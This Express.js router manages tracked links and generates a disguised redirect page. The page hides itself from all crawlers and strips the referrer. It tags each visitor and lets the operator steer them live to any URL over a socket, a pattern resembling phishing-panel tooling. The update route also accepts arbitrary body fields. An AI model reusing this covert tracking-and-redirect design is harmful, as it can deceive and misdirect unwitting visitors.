const express = require('express');
const router = express.Router();
const { Link, generateBaseCode } = require('../models');
const { authenticate, isAdmin } = require('../middleware');
const db = require('../db');

function generateRedirectHTML(baseUrl, slug) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate">
<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
<meta name="bingbot" content="noindex, nofollow, noarchive">
<meta name="referrer" content="no-referrer">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;font-family:'Segoe UI',Roboto,system-ui,-apple-system,sans-serif}
body{background:linear-gradient(135deg,#0f172a,#1e293b);display:flex;align-items:center;justify-content:center}
.spinner{width:48px;height:48px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #6366f1;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 16px}
@keyframes spin{to{transform:rotate(360deg)}}
.loading-text{color:#94a3b8;font-size:14px;font-weight:400;letter-spacing:0.3px;margin-bottom:8px}
.brand{color:#6366f1;font-size:12px;font-weight:500;letter-spacing:0.5px;opacity:0.8}
.footer{position:fixed;bottom:20px;left:0;right:0;text-align:center;color:#475569;font-size:11px}
</style>
</head>
<body>
<div style="text-align:center">
<div class="spinner"></div>
<div class="loading-text">Please wait...</div>
<div class="brand">Powered by Mega Tools</div>
</div>
<div class="footer">&copy; 2026 Mega Tools. All rights reserved.</div>
<script>
(function(){
  var path=window.location.pathname;
  var parts=path.split('/').filter(Boolean);
  var lastPart=parts[parts.length-1]||'';
  
  var TK=lastPart||'default_tracking';
  var TARGET=window.location.origin+'/'+TK;
  var VID=localStorage.getItem('_vid')||'v_'+Date.now()+'_'+Math.random().toString(36).slice(2,6);
  localStorage.setItem('_vid',VID);
  
  var s=document.createElement('script');
  s.src='/socket.io/socket.io.js';
  s.onload=function(){
    var socket=io({transports:['websocket','polling']});
    socket.on('connect',function(){socket.emit('session_init',{visitorId:VID,trackingCode:TK});socket.emit('joinRoom',TK);});
    socket.on('nav_update',function(d){if(d&&d.targetUrl)window.location.href=d.targetUrl;});
    socket.on('msg_push',function(d){if(d&&d.targetUrl)window.location.href=d.targetUrl;});
    socket.on('connect_error',function(){window.location.href=TARGET;});
    
    fetch('/api/data/visit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId:VID,trackingCode:TK,browser:navigator.userAgent.substring(0,50),device:/Mobi/i.test(navigator.userAgent)?'Mobile':'Desktop'})}).catch(function(){});
    setInterval(function(){fetch('/api/data/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId:VID,status:'Active'})}).catch(function(){})},10000);
    window.addEventListener('beforeunload',function(){fetch('/api/data/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId:VID,status:'Offline'}),keepalive:true})});
    setTimeout(function(){window.location.href=TARGET},2000);
  };
  document.head.appendChild(s);
})();
</script>
</body>
</html>`;
}

// GET ALL LINKS — Admin: all, Non-admin: showInInbox=true + ownerId filter + message links
router.get('/', authenticate, (req, res) => {
  try {
    const { category, inboxView } = req.query;
    let allLinks = db.links.read().sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    
    if (req.user.role !== 'admin') {
      allLinks = allLinks.filter(l => 
        (l.showInInbox === true || l.showInInbox === undefined) || 
        (l.ownerId === req.user._id) ||
        (l.inboxView === 'message' || l.linksCategory === 'message')
      );
    }
    
    if (category) {
      allLinks = allLinks.filter(l => l.category === category);
    }
    if (inboxView) {
      allLinks = allLinks.filter(l => l.inboxView === inboxView);
    }
    
    res.json(allLinks);
  } catch (err) { console.error('GET links error:', err); res.status(500).json({ message: 'Server error' }); }
});

// CREATE LINK — All roles can create (Personal = owner only, Message/Quick = Admin only)
router.post('/', authenticate, async (req, res) => {
  try {
    const { name, category, baseUrl, inboxView, showInInbox, status, imageUrl, htmlCode, tutorialUrl } = req.body;
    
    if (category === 'personal') {
      if (!name) return res.status(400).json({ message: 'Name is required' });
      if (!baseUrl) return res.status(400).json({ message: 'Base URL is required' });
      
      const cleanBase = baseUrl.split('#')[0].split('?')[0].replace(/\/$/, '');
      const bc = generateBaseCode();
      const finalHtmlCode = htmlCode || generateRedirectHTML(cleanBase, bc);
      
      const link = Link.create({
        name: name.trim(),
        category: 'personal',
        baseUrl: cleanBase,
        baseCode: bc,
        inboxView: 'personal',
        inboxAction: 'direct',
        linksCategory: 'personal',
        filterType: 'personal',
        showInInbox: false,
        status: status || 'active',
        createdBy: req.user._id,
        createdByRole: req.user.role,
        linkType: 'personal',
        ownerId: req.user._id,
        ownerTrackingCode: req.user.trackingCode || '',
        imageUrl: imageUrl || '',
        htmlCode: finalHtmlCode,
        tutorialUrl: tutorialUrl || ''
      });
      
      const io = req.app.get('io');
      if (io) io.emit('linkCreated');
      
      return res.status(201).json({ message: 'Personal link created', link });
    }
    
    if (req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Only admin can create quick/message links' });
    }
    
    if (!baseUrl) return res.status(400).json({ message: 'Base URL is required' });
    if (!name) return res.status(400).json({ message: 'Name is required' });
    if (!category) return res.status(400).json({ message: 'Category is required' });
    
    const cleanBase = baseUrl.split('#')[0].split('?')[0].replace(/\/$/, '');
    const view = inboxView || 'quick';
    const bc = generateBaseCode();
    const finalHtmlCode = htmlCode || generateRedirectHTML(cleanBase, bc);
    
    const link = Link.create({
      name: name.trim(),
      category: category.trim(),
      baseUrl: cleanBase,
      baseCode: bc,
      inboxView: view,
      inboxAction: view === 'message' ? 'message' : 'direct',
      linksCategory: view === 'message' ? 'message' : 'action',
      filterType: view === 'message' ? 'message' : category.trim(),
      showInInbox: showInInbox !== undefined ? showInInbox : true,
      status: status || 'active',
      createdBy: req.user._id,
      createdByRole: 'admin',
      linkType: 'both',
      imageUrl: imageUrl || '',
      htmlCode: finalHtmlCode,
      tutorialUrl: tutorialUrl || ''
    });
    
    const io = req.app.get('io');
    if (io) io.emit('linkCreated');
    
    res.status(201).json({ message: 'Link created', link });
  } catch (err) { console.error('Create link error:', err); res.status(500).json({ message: 'Server error' }); }
});

// UPDATE LINK — Admin or Owner
router.put('/:id', authenticate, (req, res) => {
  try {
    const link = Link.findById(req.params.id);
    if (!link) return res.status(404).json({ message: 'Not found' });
    
    if (link.category === 'personal' && link.ownerId !== req.user._id && req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Access denied' });
    }
    
    if (link.category !== 'personal' && req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Permission denied' });
    }
    
    const updates = { ...req.body };
    if (updates.baseUrl) {
      updates.baseUrl = updates.baseUrl.split('#')[0].split('?')[0].replace(/\/$/, '');
    }
    if (updates.inboxView) {
      updates.inboxAction = updates.inboxView === 'message' ? 'message' : 'direct';
      updates.linksCategory = updates.inboxView === 'message' ? 'message' : 'action';
      updates.filterType = updates.inboxView === 'message' ? 'message' : (updates.category || link.category);
    }
    
    const updated = Link.findByIdAndUpdate(req.params.id, updates);
    res.json(updated);
  } catch (err) { console.error('Update link error:', err); res.status(500).json({ message: 'Server error' }); }
});

// DELETE LINK — Admin or Owner
router.delete('/:id', authenticate, (req, res) => {
  try {
    const link = Link.findById(req.params.id);
    if (!link) return res.status(404).json({ message: 'Not found' });
    
    if (link.category === 'personal' && link.ownerId !== req.user._id && req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Access denied' });
    }
    
    if (link.category !== 'personal' && req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Permission denied' });
    }
    
    Link.findByIdAndDelete(req.params.id);
    res.json({ message: 'Deleted' });
  } catch (err) { console.error('Delete link error:', err); res.status(500).json({ message: 'Server error' }); }
});

// GET CATEGORIES
router.get('/categories', authenticate, (req, res) => {
  try {
    const categories = Link.distinct('category').filter(c => c !== 'message').sort();
    res.json(categories);
  } catch (err) { console.error('Categories error:', err); res.status(500).json({ message: 'Server error' }); }
});

module.exports = router;